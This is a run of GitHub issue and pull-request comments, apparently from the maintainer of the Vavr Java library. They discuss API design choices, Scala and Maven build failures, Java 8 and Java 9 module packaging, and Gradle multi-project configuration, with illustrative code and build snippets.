recoverUnit\nIt can be applied to all underlying value types, not only Void\nIt is syntactic sugar for onFailure(Consumer), that has to explicitly check the type within the given Consumer\nIt can be applied fluently because it isn't a static method\n. Hi Daniel,\n\nthank you for your suggestion! I've thoroughly thought about it. I see the benefit but think it does not fit well into Vavr.\nOrd/Ordering is syntactic sugar for an existing concept. Beside the syntax aspect, the main design of Comparator is already okay, it is a functional interface and therefor allows pure implementations.\nWhat is really missing in Java isn't syntactic sugar for the Comparator, it is a Comparable interface that behaves like Iterable.\n\nIterable gives you an Iterator\nComparable does not give you a Comparator\n\nThis makes it hard to create type hierarchies (like collections) where types are marked to have an underlying Comparator. In Vavr we added Ordered for that purpose. However, in Vavr 1.0.0 it will be internally visible only because I want to expose as few types as possible to the outside.\nMy vision is to remove things from Vavr, step by step while Java evolves over time. The modularization of the library goes hand-in-hand with this strategy.\nThe most important principle is:\n\nWe don't replace existing concepts (we make compromises) but we add missing features (while trying to get feature complete).\n\nHowever, adding missing features must be differentiated:\n\nWith Match and For we added pattern matching and for comprehensions. I think that was a mistake. These features could be handled efficiently by the compiler. We had to add them as runtime features, which has a significant performance impact. Also the syntax is not as good at it could be with native language support. If I could do it again, I would leave them away. With the same argument, I do not want a Trampoline for tailrec simulation, etc.\nMatch and For are a good example for features that might eventually come to Java, at least we will see pattern matching in not too far distance. Adding new features to Vavr increases the risk of diverging from the original language. Match is a good example. I've learned from the past and won't do that anymore.\n\nThere are three other examples where we replaced existing Java concepts:\n\nOption - Java has Optional period. We know that it is not designed to be a sum type and we have to live with it. If I needed to design a public API, I would use Optional whenever possible. I would use Vavr's Option locally because of its semantics and rich API, which plays well together with other Vavr types. Also Option is the only solution for serializable data objects with optional properties. So it is ok to diverge from native Java here by introducing the Option type, because it adds missing features that cannot accomplished in another way.\nIterator - our Iterator isn't persistent, it is stateful. So it can be seen as replacement for java.util.Iterator. However, we need it under the hood for an efficient implementation of our collections. In fact it is very similar to java.util.stream.Stream - but more powerful in the sense of feature-richness.\nFuture - when looking at CompletableFuture, I see a monolith that is a concept on its own. Some say, it is a monad but no one cared about abstracting over it by deeply integrating general concepts into the language - for example by supporting sum types. Sadly this concept will be missing when we will see native pattern matching. Compared to CompletableFuture, our Future can be used with almost the same syntax that other sum-types offer us.\n\nIt is a different story regarding our functions and collections. They do not replace existing Java types. Java does not have functions of arity > 2 or checked functions. Also Java does not have persistent collections.\nYou see, I want to talk as much Java as possible. By extending Comparator, it would integrate well but trading one or more new type(s) for syntactic sugar is too costly. My goal is to remove things for the upcoming 1.0.0 (or at least make them invisible to the outside).\nI hope you understand that I think in this direction.\nThx\n- Daniel\nPS: I think we should close the issue. Fixed with #2172. Hi @CauchyPeano, thank you!\nI will take a look this evening and comment the PR!. Hi @yegor256, are you on Windows? You are the third user who reports this phenomen (within a short time window). Currently I can\u2019t reproduce it on a Mac. I\u2019m searching the reason - something must have been changed, it worked before.\nMost probably the scala-maven-plugin (used by our code generator) has a classpath that contains two different Scala versions. I will check that.. I think @tmtron found the origin of the issue. We use another Scala version in the same classpath for our benchmarks. The workaround is to use an older Scala version (see link above). We will fix the multi-project configuration.. @tmtron Many thanks for the support!\n\nAFAIK Scala runs on the JVM, so it should not be dependent on the OS.\n\nIt could be still an issue with the order of classpath dependencies\n\nWhich Maven/JDK versions do you use?\n\nMy version is:\nbash\n$ mvn -version\nApache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-10T17:41:47+01:00)\nMaven home: /usr/local/Cellar/maven/3.3.9/libexec\nJava version: 1.8.0_144, vendor: Oracle Corporation\nJava home: /Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home/jre\nDefault locale: en_US, platform encoding: ISO8859-1\nOS name: \"mac os x\", version: \"10.12.6\", arch: \"x86_64\", family: \"mac\"\nI will update Maven now and try again.... Upgraded Maven to 3.5.0, mvn clean test produces the same result (ok):\nbash\n[INFO] ------------------------------------------------------------------------\n[INFO] Reactor Summary:\n[INFO] \n[INFO] Vavr Parent ........................................ SUCCESS [  0.465 s]\n[INFO] Vavr Match ......................................... SUCCESS [  2.385 s]\n[INFO] Vavr ............................................... SUCCESS [01:41 min]\n[INFO] Vavr Benchmark ..................................... SUCCESS [  4.384 s]\n[INFO] Vavr Test .......................................... SUCCESS [ 19.247 s]\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time: 02:08 min\n[INFO] Finished at: 2017-10-23T15:42:05+02:00\n[INFO] Final Memory: 60M/1596M\n[INFO] ------------------------------------------------------------------------\n=\u03bb=:vavr daniel$ mvn -version\nApache Maven 3.5.0 (ff8f5e7444045639af65f6095c62210b5713f426; 2017-04-03T21:39:06+02:00)\nMaven home: /usr/local/Cellar/maven/3.5.0/libexec\nJava version: 1.8.0_144, vendor: Oracle Corporation\nJava home: /Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home/jre\nDefault locale: en_US, platform encoding: ISO8859-1\nOS name: \"mac os x\", version: \"10.12.6\", arch: \"x86_64\", family: \"mac\"\n. @tmtron thanks for the help. I switched now to Scala 2.10.6.\nI'm sure the Scala plugin for Gradle will make a difference when solving issue #1277.. @tmtron thx! I will merge now (jdk8 build is ok, jdk9 build fails because of #2145). @szarnekow @yegor256 please update your fork, the maven build should work now.. Great, thank you! We could embed this overview in the docs.\nJavaslang was renamed to Vavr - it would be great to also add it because Javaslang isn't updated anymore.. Awesome, thank you \ud83d\ude0a. @talios thanks for the hint! I will create an issue.\nNote: Because of #1716 we will have a new code generator. The 'inline' generated code will not be annotated with @Generated anymore. See also this tweet.. @valery1707 Yes, @nfekete is right, we have to keep the casts because of GWT \ud83e\udd14\nI will close the issue and reject the PR.\nHowever, many thanks for your work!. Yes, it would be Variant 1 of the blog post but I think you mean that PartialFunction does not implement Function.\nIn Scala PartialFunction extends Function1. This enables us to handle different cases:\n```java\nvar sample = List.range(1, 4);\nvar isEven = Function1.of((Integer i) -> i + \" is even\").partial(i -> i % 2 == 0);\nvar isOdd = Function1.of((Integer i) -> i + \" is odd\").partial(i -> i % 2 == 1);\n// = List(\"1 is odd\", \"2 is even\", \"3 is odd\");\nList numbers = sample.map(isEven.orElse(isOdd));\n```\nwhere sample.map takes a java.util.function.Function.\nOn the one hand using partial functions in places where functions are expected is unsafe. On the other hand we would loose several use-cases for partial function.\n\nFor me, this is a signal that we do it wrong with partial functions. For Vavr 1.0.0 we should do the following:\n\nremove PartialFunction from io.vavr.core, especially Function1 should not depend on PartialFunction\nmove PartialFunction to io.vavr.match because pattern matching is our only use-case for partial function (I think collect does not work at all)\nlet PartialFunction stand on its own, it should not extend Function1 or j.u.Function\n\nReason: Scala has PartialFunction deeply integrated into the language (e.g. pattern matching and the case literal). We can't do that in Java. Trying to integrate it on our own seems artificial and it does not scale well regarding future versions of Java (which will come with native pattern matching).\n. JDK9 has javax.annotation.processing.Generated,\nJDK8 has javax.annotation.Generated.\nWe cannot have both at the same time, so for now we will remove it again :-/. Thanks for reporting it! It shows that we need to ensure (at build time) that some specific API is correctly overridden.. 'reject' is a standard name, see Martin Fowler's Collection Pipeline:\n\n. I thought about it, this one has too many implications on other APIs. Using a simple get(int) instead (if the prev value is needed) solves the issue.\nThx for reporting! I hope you don't mind if I close the issue - I need to catch up with the issues of the last months.... Hi @valery1707,\nI think this issue was closed automatically because I switched branches. (old master is not v0.9.x).\nMaybe we need to open a new PR for the v0.9.x branch.... Yes, we will add specialized For overloads for our monadic types (see #1629 (and #2171)).. Thx, great suggestion. PR welcome \ud83d\ude04. Fixed with https://github.com/vavr-io/vavr-docs/commit/ac5b4d8bcbd07bab0da136c7bf5d12b52f2da55e and https://github.com/vavr-io/vavr-docs/pull/35\n/thx @valery1707 . We should keep the API as slim as possible. When it comes to convenience methods / syntactic sugar and Scala does not have that API it is a signal for us not to include it.\nI prefer to close this PR.\nFor new features it is always better to open an issue before in order to discuss it. However, I see that one new method is not a big deal but adding here and there one convenience method will blow up the API over time.\nThx!. As already stated I close this PR.\n@valery1707 keep on the great work, it is always hard to say 'no' - we need to take special care when adding new things.. Many thanks, also to the reviewers! Good work.. Yes, we will add For methods for our monadic types, see #1629.. Hi @szarnekow, interestingly, with JDK9, for me 2.10 does not work but with 2.12 it compiles fine.\nI think I will not but put more effort into making Vavr work with the scala maven plugin. Instead I move to Gradle and switch the code generator from Scala to code.js, which is already in the make.\nThx for looking into it & have a great weekend!. Generally we support both versions, Java 8 and Java 9, therefore we do not enforce the version. The target version is 1.8 (source and binary).\nMaybe enforcing jdk9 for the build will solve the issue. The target can remain 1.8.. Tagged and released to Maven Central.\nIt will take a while until it appears on http://search.maven.org\nRelease notes and official (Twitter) announcement will follow today.. We have another use-case: collect(PartialFunction).\nTherefore we should keep PartialFunction as part of the core.\nScala example:\nscala\nval opt: Option[Int] = None\nval res = opt collect ({ case n if n > 0 => n + 1; case _ => 0})\n. @valery1707, mmhh, you might be right. The supplier is able to return different values on each call. I will update the issue title.. Stream and Iterator continually are not ambiguous I think. Then it should be also ok for fill. But we have to test it.. @hepin1989 because the Scala code generator will be replaced. We will not use Scala anymore for the build-process.. We will stick with Maven and with the Scala code generator.\nMoving to another tooling does not provide any value for end-users.\nFor s committers it is only time-consuming effort and the risk that we will introduce new issues.\nTherefore I will close this PR.\nThanks for all the effort!!!. capsule is really nice!. Looks great, thank you!\nAlways a good feeling to delete code :)\n. Hi @NataliiaPrivezentseva, I really appreciate your hard work on this issue. However, I realized that code duplication is no viable alternative for us. It makes the tests hard to maintain over time, the lines of code increased by factor 5.4 for the corresponding tests. Therefore I will close this PR.\nThere can be only one solution to solve #1807 - all collections need to return the same instance in the corresponding cases. But we need to decide, if this makes really sense in all cases. For example, if the performance (significantly) decreases when performing extra checks, if the same instance should be returned, we will create another instance instead. We will see...\nThanks for contributing and sorry for closing the ticket - this is always a hard decision for me.. Thank you. I think we need to be more specific when creating issues.... @grzesiek-galezowski Yes, your PR looked very nice and clean! Will merge when the travis-ci build finished.. Currently we have to disjoint union types: Either and Validation.\n\nboth types are biased, Either operates on Right, Validation operates on Valid\nboth currently have map, mapLeft and bimap\nother bixxx methods are not present\nthe non-biased / alternate methods are named differently, e.g. Validation.getErrors() and Either.getLeft(). This makes it currently impossible to have a unified interface for both\n\nWe should unify the names and have a hidden common interface, maybe similar to Value?\nFor the Map collection we use similar methods. E.g. Map.bimap that takes a Key and a Value mapper.\nI like the idea to provide similar-named overloads throughout the library, like @nfekete suggested.. > What do you think @danieldietrich ?\nClarifying a specific behavior in the Javadoc is always a good idea! Please go ahead @grievejia \nI think regarding union() and addAll() we should not expose implementation details in the sense that specific methods are called under the hood. Instead we should write some notes about the effect, i.e. that the cost of replacing a single element could be linear in the worst case.\n\nWhy not just refuse to add the new element if it's already contained?\n\nThe main reason is that object equality does not imply that the object's state is equal. For example you could define that two persons are equal, if their name is equal but if you added a person to a Map you rely on the fact that the instance you provided is part of the Map. That's important if there are other attributes, like a Persons age, that differ but are not considered in the equals implementation.\n. Currently we rely on java.util.concurrent.Future returned by an ExecutorService.submit() because of cancellation. That is the only dependency.\nI think we can get rid of ExecutorService, similar to this. I've prototyped a version but have a remaining open point - I need to get the running Thread of the Future computation in order to be able to interrupt it if necessary. Will take a look tomorrow.\n. I think I have an idea - an Executor's execute method takes a Runnable. We could 'trap' it by wrapping the unit of work in an own runnable, which stores the 'current thread' (from the view-point of the runnable) somewhere.\nThen we should be done (modulo synchronization boilerplate code etc.). I will check that tomorrow.. Hey @404-,\nI would be very interested in examples on how to use Vavr's Future in conjunction with Akka (as you mentioned above). Are you interested in a guest post on the Vavr blog?\nAlso I'm interested in your expectations regarding handling of fatal errors, like those:\njava\n    static boolean isFatal(Throwable throwable) {\n        return throwable instanceof InterruptedException\n                || throwable instanceof LinkageError\n                || throwable instanceof ThreadDeath\n                || throwable instanceof VirtualMachineError;\n    }\nSee also #2198 . @404- thanks for the detailed reply!\n\nI could write something up, but I'm not sure if there's enough content. (...) Is this the kind of content you had in mind for a blog post?\n\nYes, even a one-pager would be interesting for the audience, e.g. a hello world with Akka + Vavr.\nFor example showing a minimal setup with Maven or Gradle. We have a quite big audience :)\nThe easiest way is to prepare it as markdown, e.g. in a private Gist. I will put it all on the blog then.\n\nRegarding fatal errors, I'm not sure if anything else needs to be done in addition to re-throwing them (...) Just let it crash, right? Or am I missing something?\n\nYes, letting the application crash in the presence of fatal errors seems the way to go.\nThx!. @404- Many thanks, I will do that later today!. @404- your code looks great! I like the $InstanceOf pattern, we should integrate it in Vavr. I will create an issue (-> see #2205)\n. Hi @404-, thank you! Could you please add a short introduction of yourself? I will add it as guest post to blog.vavr.io. The reader should know that the credits go to you (optionally with profile pic).. Our Future implementation will be dropped. There will be no Vavr 1.0 module vavr-concurrent.\nReason: Implementing our own concurrency library is too error-prone, concurrency is a hard problem. There are many(!) alternatives, first of all Java's native CompletableFuture. Commenting the thoughts above:\n\nCallable throws Exception instead of Throwable, e.g. we cannot provide a default implementation that calls CheckedFunction0.apply without wrapping the Throwable\n\nThe CheckedFunctions throw Exception now, so this isn't a problem anymore.\n\nIs it possible to build a Java 9 runtime env without the concurrent package? If so, Vavr would depend on that package/module because of CheckedFunction0.\n\nj.u.concurrent is part of the java.base module, so it should be no problem\n\nWith future Java changes there might be primitive generic. We then want to use CheckedFunction0 to represent a CheckedRunnable. That requires Callable to also accept a primitive generic.\n\nIf Java accepts primitive generics, this will most probably impact the complete Vavr lib, not only the CheckedFunction0. So we can ignore this for now.. Travis-CI seems to have problems. Local build works find. Will merge the PR now.. For now I will not further invest in vavr-test and keep it as-is because JUnit 5 is the 'defacto standard' and it offers property testing.. Our Future implementation will be dropped. There will be no Vavr 1.0 module vavr-concurrent.\nReason: Implementing our own concurrency library is too error-prone, concurrency is a hard problem. There are many(!) alternatives, first of all Java's native CompletableFuture. I will close this for now. It is questionable if we should invest more in pattern matching because Java will have native pattern matching.. Hi @Bill, thank you for putting so much effort into this issue!\nI fully agree with your suggested list of overloads! We should definitely add those.\n\nTry.toValidation(fn) is already there on our master branch.\nwe prefer the more general Function over Function1 as argument type. Sadly, I have to admit that lately I have been a little careless in the care of the issues. With Vavr 1.0.0, we align more tightly to Scala. I've finished a first alpha version of the vavr-control module, which will contain Option, Either and Try. Especially, Validtation will reside outside of that module.\n\nThe conversion methods of the vavr-control module have (more or less) a final state now. So this issue is obsolete. I will close it.\n\n@CauchyPeano this also has an impact on your PR #2304. I really appreciate your effort, sorry for discarding your work.. \ud83e\udd14 Interestingly the CI tests failed both Java 8 and Java 9 for two Euler tests... Maybe the upcoming changes will heal them again.. Thx!. Thanks for the changes and sorry for the delay!!. Hi Igor, thank you for your PR!\nI think the new method does not scale well. It is a very specific use-case to cover Seq<T> only. Java users may prefer to use one of java.util.* collections instead, an Iterable or an array T[].\nAdditionally, the API is not specific for Validation - all Vavr types that represent a Value, like Option, Try, etc. could have it.\nThe best way to achieve the result currently is:\njava\nvalidation1.flatMap(seq1 -> validation2.map(seq1::appendAll));\nAlternatively using Vavr's For-Comprehension (needs #2171 to be implemented):\njava\n// currently the result is Iterable<Seq<String>>\n// with #2171 the result will be Validation<E, Seq<T>>\nFor(validation1, validation2).yield(Seq::appendAll);\nSo I think we should close this PR.. Scalaz has a general notion for that method. It isn't defined on a Scala companion object (which is the same as static in Java) but as instance method of the class.\nAlso Scalaz does not restrict the append method to Seq types but to Semigroups, i.e. all combinable types that obey specific rules.\nScalaz defines it once and it applies to all types. We would need to implement it as static method n-times on each type.\nAdditionally, it would lead to ambiguities, if we wanted to provide the same functionality for different inputs regarding the generic type argument. More specifically these methods could not exist side-by-side (from the perspective of a call-site):\n```java\nstatic  Validation> append(Validation> first, Validation> second) { ... }\nstatic  Validation> append(Validation> first, Validation> second) { ... }\n```\nValidation.sequence is of a different flavor. The return type is baked into the method name. In contrast to the example above different implementations could therefore co-exist. The only drawback is, that we also have to implement it n-times.\n```java\nstatic  Validation> sequence(Iterable<? extends Validation> values) { ... }\nstatic  Validation> distinct(Iterable<? extends Validation> values) { ... }\n```\nThe static sequence method exists because we do not have any alternatives. For append it is a different case, we have a relatively concise alternative (see my previous comment).\njava\nstatic <E, T> Validation<E, Seq<T>> sequence(Iterable<? extends Validation<E, T>> values) {\n    Objects.requireNonNull(values, \"values is null\");\n    List<E> errors = List.empty();\n    List<T> list = List.empty();\n    for (Validation<E, T> value : values) {\n        if (value.isInvalid()) {\n            errors = errors.prependAll(value.getErrors().reverse());\n        } else if (errors.isEmpty()) {\n            list = list.prepend(value.get());\n        }\n    }\n    return errors.isEmpty() ? valid(list.reverse()) : invalidAll(errors.reverse());\n}\n\nThese static methods generally are a pain in the ass from the perspective of a maintainer. We can't statically check, if all classes implement them (the right way). It is kind of code duplication.. Thanks!. Could you please point to the related discussion? I'm not aware of the topic. Thx!\nUpdate: I found it in the title :) In fact I created the issue 3 months ago.... Hi Igor,\nI tried to recapitulate what my intention was creating issue #2183.\nIn Scala, we have different conditions than in Java. Scala does not distinguish between suppliers, consumers, runnables and functions - there are just... functions. This is because there is no distinguished return type 'void'.\nThis is the reason why Scala's Future.onComplete(), foreach() and andThen() take functions. The returned value is just ignored - it might be a value, or just Unit (see also the difference between Nothing and Unit in Scala).\nFuture's methods onComplete(), forEach() and andThen() are intended to perform side-effects. In Java, the only way to express this is using Consumer as argument. If we use Function, we effectively have to return something. This is the most important difference to Scala.\nI'm afraid, therefore we have to keep the original forEach(Consumer).\nI will close this PR and also my issue. This is not the right way to do it in Java.\nSorry, I really appreciate your effort and your contribution! I hope you understand.. @CauchyPeano thanks!\nYou could take a look at #1629. I will assist you on any questions!\nIt involves the code generator.. Hi @imode69,\nthanks for the suggestion!\nAll Checked* interfaces should have am unchecked method, including CheckedConsumer.\nI'm afraid, an overload is not possible because of ambiguities on the call-site. However, the adding the unchecked method should be fine!. @jlorenzen Yes, I understand the benefits of having it. So, let's add the concat method.\n(Having an append might ignite the desire to also add a prepend, which is unnecessary when swapping the tuples and using concat instead.)\n\nTuple1 should have concat(Tuple1)..concat(Tuple7)\nTuple2 should have concat(Tuple1)..concat(Tuple6)\n...\nTuple7 should have concat(Tuple1)\nTuple8 should have no concat method\n\nDoes anyone see a use case for the following?\n\nadd also concat(Tuple0) to Tuple*\nTuple0 should have concat methods\n. Fixed with #2221 . There leaked existing commits from upstream/master into your branch.\n\nPlease rebase your changes again or create a new branch of the current master and cherry-pick your relevant commits.. @CauchyPeano no problem, a new PR is okay!. Hi Islah,\nthank you for your question.\nWe have thought about it to add flatten1) as static function to our types.\nHowever, I think the benefit over flatMap(t -> t) isn't that great to make a good case for the extra maintenance aspect of static methods outside of the type hierarchy.\nI hope you understand that we will not add it to the library.\nThanks for using Vavr!\n- Daniel\n1) we prefer to align our names to Scala instead of Haskell. Thank you!. Hi @valery1707, I will take a look today. We observed that 'flickering' also sometimes in the JDK8 build, see #2203 but it isn't reproducible on a local machine.. All the other things conceptually look great!\n\n[x] Tuple0 has concat and append methods\n[x] Tuple1..Tuple8 do not concat Tuple0\n[x] we omit impossible methods instead at throwing at runtime\n[x] we use concat for Tuple args and append for value args\n. Awesome, thank you! \ud83d\udc4d\ud83c\udffc\n\n(the build is known to flicker - it is a CI problem with our concurrent tests, it isn't currently prio 1 for me to fix that). \ud83d\ude05. Great, thank you N\u00e1ndor!. It would be even nicer to prevent impossible calls on the type level but unfortunately it is not possible (in Java).\nSuch as\n```java\ninterface EmptyTraversable extends Traversable {\nT head();\nEmptyTraversable<T> tail();\n\nT avg();\nT max();\nT min();\n\n// ...\n\n}\n```\nBut we needed to to that for the whole collection type hierarchy:\njava\ninterface EmptySeq<T> extends Seq<T>, EmptyTraversable<T> {\n    // ...\n}\netc.\nVavr's take is that Java is not the right language for this kind of safety. In many cases Java itself is unsafe. We still offer API that performs well in the sense that no wrapper classes like Option are created.. I fully understand it. Maybe it is not the right approach for the next version of Vavr to blindly follow Scala. Maybe it would be better to eliminate unsafety whenever possible.\nOne of the most basic methods is Value.get(). It should return an Option instead of throwing if no value is present. This would have several implications, e.g. that Option should not have a get() method anymore.\nThis would have an impact on how we program. It is like in ECMAScript 6, we can't escape a Promise.\ntypescript\ngetValueAsync() // = Promise<T>\n    .then(value => ...) // = Promise<U>\n    .catch(err => ...); // = Promise<V>\nSimilarly, we can't escape an Option (without providing a default value):\njava\nOption.of(...)\n    .map(...) // transforms value\n    .forEach(...); // possibly sends a 'message' to another function\nSending messages would be impure. But on the other hand this is exactly what a program does at some point - performing side effects, like writing to the database, console, etc.\nYet we would be able to pull out values out of their 'context' by providing default values or 'intentionally' throwing.\nGiving up unsafe methods might sound scary the first moment but it would be much more straight forward without really loosing anything.. @emmanueltouzery I will take these ideas into account. I really appreciate that you are volunteering to bring these changes to Vavr. But I will start to \u2728bootstrap\u2728 Vavr 1.0.0 this weekend on a branch by starting from scratch with an empty repository. This gives me the opportunity to add and document aspects of the library step-by-step and also to revisit the type level and think critically about the one or the other thing. Maybe prelude.ts can help here, too.\n\nwe've had a crash in prod due to an experienced developer using reduce on an empty list\n\nMy goal will be to provide a solution that we are able to reason about. Thank you for your faith in Vavr!\n\na safe and fast variant for max could be List.of(1,2).transform(List::max) which would be static and accept Seq (with overloads)\n\nYes, safety over conciseness will be the guiding principle.. Great finding. Well done!. I agree, supporting Java 8 should be the goal, especially because we do not use any Java 9 features besides module-info.java.\n@SergejIsbrecht  Java 8 is important for most Vavr users! Thx for volunteering, I'm already on it.\n@talios @yuriykulikov@Opalo thx! ok, understood :) I will figure out how to support both Java 8 and native modules. But remember, the Vavr 1.0 API will break backward compatibility in several places. \nHowever, when we support Java 8, the internal package will leak into the public API. We could move them to the parent package and make them package-private. But I don't know if we are able to hide them from the Java 9 module public API then. (Our modules are closed for reflection, but I haven't tested it, yet).\n@emmanueltouzery \n\nbut it may become a hindrance if/when java gets pattern matching\n\nAdding them later is possible without braking bw compat. I want to wait for the final patmat feature. Maybe we need to change the impls in order to get patmat working with Vavr.\n. I've thought about our options.\nBuilding binaries for both Java 8 and Java 9\nWe don't use any other features from Java 9 than the module system. Our main-use case is not exposing the modules to the outside, this is a positive side-effect. The main use-case of adapting Jigsaw is to have a clean architectural design of our inter-package dependencies. More specifically, we benefit from Jigsaw during development time.\nBecause we 1) only use Java 8 API and 2) effectively only have an additional module-info.java of Java 9, we are able to produce Java 8 and Java 9 binaries from the same sources. Now, here we have two options:\n\nCreate multiple versions of each jar, one for Java 8 and one for Java 9 (by using classifiers)\nCreate multi-release jars, which contain Java 8 classes plus an additional module-info.class for Java 9+\n\nThe Gradle team looks critically at multi-release jars. This is because it is hard to reason about the behavior of an application when different versions (and different dependencies) are bundled at the same time. With multi-release jars the gap between source-code, modules and artifacts gets bigger.\nHowever, we are in the comfortable situation that for both runtimes, Java 8 and Java 9, we use exactly the same source-code. Only the module-info.class is additionally used by the Java 9 runtime. Therefore I think a multi-release jar is (currently) the perfect solution for us. I don't see any drawbacks.\nI will start to update the Gradle build accordingly.\nHiding implementation classes\nHaving an internal package in Java 9 that is not exported by the module solves the issue of hiding classes. However, putting the classes in a separate package (and making them therefore public) makes most sense when the classes are referenced from multiple packages.\nIn Java 8 such an internal package would leak the implementation classes to the outside, because they need to be public.\nTherefore I think it is a better solution, to put make the implementation classes package-private and put them directly into the package of their interfaces/abstract classes. This will solve our original use-case of hiding the classes for both, Java 8 and Java 9.\nEspecially (I think, but have to re-evaluate it) these package-private classes are not discoverable via reflection in Java 9, if the module isn't declared as open.\n. I need a helping hand with this: Multi-Release JAR that contains Java 8 binaries + Java 9 module-info.class.\n/cc @SergejIsbrecht . @SergejIsbrecht great!\n@Opalo \n\nI'm wondering only if this is possible for all classes\n\nWe already do this for internal classes in Vavr 0.9. However, in Java 8 they are still discoverable using reflection. Namely changing internal classes might break backward compatibility. Java 9 modules to the rescue!\n\nIf so maybe it's better idea to prepare separate builds now and save some time in the future\n\nIn my experience this would be too early optimization. We currently do not need multiple versions of classes. This would add unnecessary complexity. We will add them if they are really needed.\nThx for all your thoughts and the feedback!. @SergejIsbrecht for now I fell back to a Java 8 only build. Please do not spend too much time on the Java8/Java9 multi-release jar. I think it might not work well for us or the build gets too complicated. For now a good old Java 8 build should be sufficient.. Vavr 1.0 runs with Java 11+. I switched the master branch, it now contains the first module: vavr-control v1.0.0-alpha-1. More will follow soon (e.g. vavr-collection).\nJava 8 will reach its end of life soon. Legacy applications are still able to use Vavr 0.9.x.\nThe original purpose of this issue (creating a spike) is done.. This is great, many thanks!\nI was aware of the fact that (method local, anonymous) inner classes bind the implicit this (within a non-static context) and thought we only use inner classes in static methods. I will seize the opportunity to double-check the whole code-base.\nThanks again! \ud83d\udc4d\ud83c\udffc. Update: There are 6 occurrences of new Iterator()... left in the codebase. All of them look ok to me (they produce no memory leaks). Especially Stream.cycle, which needs to hold a pointer to this.\n\n. I will prepare a bugfix release 0.9.3 the next days.. Hi @melix,\nthank you for the details, I can reproduce it.\nBut I still wasn't able to glue your hints with my Java 9 modules build (see below). Basically, the module-info.java can't be compiled because the dependent modules and exported packages cannot be found.\n\nIs the java9 sourceSet aware of the java sourceSet?\nAlso I'm not sure if I should use the '--module-path' trick anymore\nI'm not familiar with buildSrc plugins or how they might help. Will try to find resources on the web.\n\nRoot Project 'vavr'\nsettings.gradle:\n```groovy\nrootProject.name = \"vavr\"\ninclude 'vavr-core'\ninclude 'vavr-control'\n```\nbuild.gradle\n```groovy\nif (!JavaVersion.current().java9Compatible) {\n    throw new GradleException(\"Please build Vavr with JDK 9+\")\n}\nsubprojects {\n    afterEvaluate {\n        repositories {\n            jcenter()\n        }\n    group = 'io.vavr'\n    version = '1.0.0'\n\n    sourceSets {\n        java9 {\n            java {\n                srcDirs = ['src/main/java9']\n            }\n        }\n    }\n\n    compileJava {\n        sourceCompatibility = 8\n        targetCompatibility = 8\n        options.encoding = 'UTF-8'\n    }\n\n    compileJava9Java {\n        sourceCompatibility = 9\n        targetCompatibility = 9\n        options.encoding = 'UTF-8'\n        inputs.property(\"moduleName\", moduleName)\n        doFirst {\n            options.compilerArgs = [ '--module-path', classpath.asPath ]\n            classpath = files()\n        }\n    }\n\n    jar {\n        into('META-INF/versions/9') {\n            from sourceSets.java9.output\n        }\n        manifest.attributes(\n                'Multi-Release': 'true',\n        )\n    }\n}\n\n}\n```\nSubproject 'vavr-core'\nbuild.gradle\ngroovy\nplugins {\n    id 'java-library'\n}\next.moduleName = 'io.vavr.core'\nsrc/main/java9/module-info.java\ngroovy\nmodule io.vavr.core {\n    exports io.vavr.core;\n}\n(src/main/java omitted here)\nSubproject 'vavr-control'\nbuild.gradle\ngroovy\nplugins {\n    id 'java-library'\n}\next.moduleName = 'io.vavr.control'\nsrc/main/java9/module-info.java\ngroovy\nmodule io.vavr.control {\n    exports io.vavr.control;\n}\n(src/main/java omitted here)\n. @melix I think I'm nearly there.\nThe main problem is, that the src/main/java9/module-info.java files are not aware of the src/main/java/**/*.java sources anymore.\n```\n\nTask :vavr-control:compileJava9Java FAILED\n/Users/daniel/git/vavr-io/vavr/vavr-control/src/main/java9/module-info.java:3: error: module not found: io.vavr.core\n    requires transitive io.vavr.core;\n                               ^\n1 error\n```. Maybe the classpath system and the module system are now mixed-up somehow... \ud83e\udd14. @Opalo I saw on StackOverflow that you are familiar with Gradle sourceSet magic.\n\nCould you please take a look at the v1.0.0 branch?\nbash\ngit clone https://github.com/vavr-io/vavr.git\ncd vavr\ngit checkout v1.0.0\n./gradlew assemble\nThe build needs to be run with JDK9.. @Opalo @melix sorry for flooding you with messages - no further actions are needed.\nI moved a step back and implemented a simple Java 8 multi-project build.\nThat's the best solution for now, it will work with Java 8 and Java 9 and we do not risk any side-effects by piggy-backing the module-info.class in the jar.\n```groovy\nsubprojects {\n    apply plugin: 'java'\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\nafterEvaluate {\n    jar {\n        inputs.property('moduleName', moduleName)\n        manifest.attributes(\n            'Automatic-Module-Name': moduleName\n        )\n    }\n}\n\n}\n``. @melix if I omitafterEvaluateI get the following error because the subprojects define an extra propertyext.moduleName` that is used by the parent project:\n```\n$ ./gradlew assemble\nStarting a Gradle Daemon, 1 busy Daemon could not be reused, use --status for details\nFAILURE: Build failed with an exception.\n\n\nWhere:\nBuild file '/Users/daniel/git/vavr-io/vavr/build.gradle' line: 19\n\n\nWhat went wrong:\nA problem occurred evaluating root project 'vavr'.\n\nCould not get unknown property 'moduleName' for task ':vavr-control:jar' of type org.gradle.api.tasks.bundling.Jar.\n\n\n\nTry:\nRun with --stacktrace option to get the stack trace. Run with --info or --debug option to get more log output. Run with --scan to get full insights.\n\n\nGet more help at https://help.gradle.org\n\n\nBUILD FAILED in 10s\n```\n\nbuild.gradle (failing):\n```groovy\nsubprojects {\n    apply plugin: 'java'\nrepositories {\n    jcenter()\n}\n\ngroup = 'io.vavr'\nversion = '1.0.0'\n\ncompileJava {\n    sourceCompatibility = 8\n    targetCompatibility = 8\n    options.encoding = 'UTF-8'\n    options.compilerArgs = [ '-Xlint:all', '-Werror' ]\n}\n\njar {\n    inputs.property('moduleName', moduleName)\n    manifest.attributes(\n        'Automatic-Module-Name': moduleName\n    )\n}\n\n}\n```\nvavr-control/build.gradle:\ngroovy\ndependencies {\n    compile project(':vavr-core')\n}\next.moduleName = 'io.vavr.control'\nvavr-core/build.gradle:\ngroovy\next.moduleName = 'io.vavr.core'\n. @melix I haven't written a Gradle plugin, yet. Are there any good resources on that topic? Do I need buildSrc for that 